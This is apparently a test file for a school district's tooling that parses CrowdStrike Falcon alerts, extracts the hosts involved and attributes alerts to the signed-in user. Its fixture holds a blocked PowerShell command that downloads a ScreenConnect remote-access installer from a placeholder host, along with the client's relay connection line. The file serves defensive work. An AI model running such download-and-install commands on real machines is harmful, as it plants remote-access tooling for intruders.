import { describe, it, expect } from 'vitest';
import { toEdrRow, mapMailbox, extractHosts, severityRank } from './falcon-alerts';

const D = { staff: 'example.org', students: 'student.example.org' };

// A blocked ScreenConnect-installer detection, trimmed from a real record.
const detection = {
  composite_id: 'x:ind:1',
  created_timestamp: '2026-10-01T11:55:23.429950249Z',
  updated_timestamp: '2026-10-01T12:10:00Z',
  severity: 70,
  severity_name: 'High',
  status: 'closed',
  product: 'epp',
  name: 'PShellDownloadRun',
  tactic: 'Execution',
  technique_id: 'T1059.001',
  device: { hostname: 'LAB-PC-0123', device_id: 'a1b2c3d4', local_ip: '10.128.5.12' },
  user_name: 'LAB-PC-0123$',
  pattern_disposition_description: 'Prevention, operation blocked.',
  filename: 'powershell.exe',
  cmdline: "powershell.exe -Command \"$wc.DownloadFile('https://installer-host.example/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=198.51.100.78', ...)\"",
  parent_details: { cmdline: String.raw`"cmd.exe" /c "C:\WINDOWS\SystemTemp\ScreenConnect\26.6.6.9747\run.cmd"` },
  grandparent_details: {
    cmdline: String.raw`"C:\Program Files (x86)\ScreenConnect Client (0123456789abcdef)\ScreenConnect.ClientService.exe" "?e=Access&y=Guest&h=instance-abc123-relay.screenconnect.com&p=443&s=00000000"`
  }
};

describe('toEdrRow on the real ScreenConnect detection', () => {
  const r = toEdrRow(detection, D);

  it('finds the attacker relay in the GRANDPARENT, not just the alerting process', () => {
    // The alert was a blocked PowerShell. The intrusion was the grandparent.
    expect(JSON.parse(r.hosts)).toContain('instance-abc123-relay.screenconnect.com');
    expect(JSON.parse(r.hosts)).toContain('installer-host.example');
    expect(JSON.parse(r.hosts)).toContain('198.51.100.78');
  });

  it('reads blocked correctly', () => {
    expect(r.blocked).toBe(true);
    expect(toEdrRow({ ...detection, pattern_disposition_description: 'Detection, standard detection.' }, D).blocked).toBe(false);
    expect(toEdrRow({ ...detection, pattern_disposition_description: 'Prevention/Quarantine, process was blocked from execution and quarantine was attempted.' }, D).blocked).toBe(true);
  });

  it('does not attach a machine account to a person', () => {
    expect(r.mailbox).toBeNull();
  });
});

describe('mapMailbox', () => {
  it('accepts a full staff address', () => {
    expect(mapMailbox(['alex.rivera@example.org'], D)).toBe('alex.rivera@example.org');
  });
  it('maps DOMAIN-backslash-user and bare usernames when the mailbox is known', () => {
    const known = new Set(['jordan.lee@example.org']);
    expect(mapMailbox([String.raw`DISTRICT\jordan.lee`], D, known)).toBe('jordan.lee@example.org');
    expect(mapMailbox(['jordan.lee'], D, known)).toBe('jordan.lee@example.org');
  });
  it('refuses a truncated name rather than guessing a person', () => {
    const known = new Set(['margaret.hollingsworth@example.org']);
    expect(mapMailbox(['Margaret.Hollingswor'], D, known)).toBeNull();
  });
  it('ignores outside domains', () => {
    expect(mapMailbox(['someone@gmail.com'], D)).toBeNull();
  });
});

describe('extractHosts', () => {
  it('skips private addresses', () => {
    expect(extractHosts('connect 10.128.4.19 and 192.168.4.41 and 198.51.100.76')).toEqual(['198.51.100.76']);
  });
});

describe('severityRank', () => {
  it('orders Falcon severities', () => {
    expect(severityRank('Informational')).toBeLessThan(severityRank('Low'));
    expect(severityRank('critical')).toBe(4);
    expect(severityRank('nonsense')).toBe(-1);
  });
});

import { userAtAlert } from './falcon-alerts';

describe('userAtAlert — attributing SYSTEM alerts to the person at the keyboard', () => {
  // One PC's Falcon login history.
  const logins = [
    { user: String.raw`WORKGROUP\LAB-PC-0456$`, at: new Date('2026-10-01T13:10:13Z') },
    { user: String.raw`DISTRICT\sam.patel@example.org`, at: new Date('2026-10-01T13:09:59Z') },
    { user: String.raw`DISTRICT\sam.patel@example.org`, at: new Date('2026-09-30T19:07:50Z') }
  ];

  it('names the person signed in before the alert, skipping the machine account', () => {
    const r = userAtAlert(logins, new Date('2026-10-01T13:12:00Z'), D);
    expect(r?.mailbox).toBe('sam.patel@example.org');
    expect(r?.loginAt.toISOString()).toBe('2026-10-01T13:09:59.000Z');
  });

  it('uses the earlier session for an earlier alert', () => {
    const r = userAtAlert(logins, new Date('2026-09-30T20:00:00Z'), D);
    expect(r?.loginAt.toISOString()).toBe('2026-09-30T19:07:50.000Z');
  });

  it('never blames whoever signs in AFTER the alert', () => {
    expect(userAtAlert(logins, new Date('2026-09-30T10:00:00Z'), D)).toBeNull();
  });

  it('gives up beyond seven days rather than naming the last occupant', () => {
    expect(userAtAlert(logins, new Date('2026-10-20T00:00:00Z'), D)).toBeNull();
  });
});

import { usualUser } from './falcon-alerts';
describe('usualUser', () => {
  it('names the only person ever seen on the PC', () => {
    expect(usualUser([
      { user: String.raw`DISTRICT\sam.patel@example.org`, at: new Date() },
      { user: String.raw`WORKGROUP\LAB-PC-0456$`, at: new Date() }
    ], D)).toBe('sam.patel@example.org');
  });
  it('names nobody on a shared PC', () => {
    expect(usualUser([
      { user: 'a.one@example.org', at: new Date() },
      { user: 'b.two@example.org', at: new Date() }
    ], D)).toBeNull();
  });
});
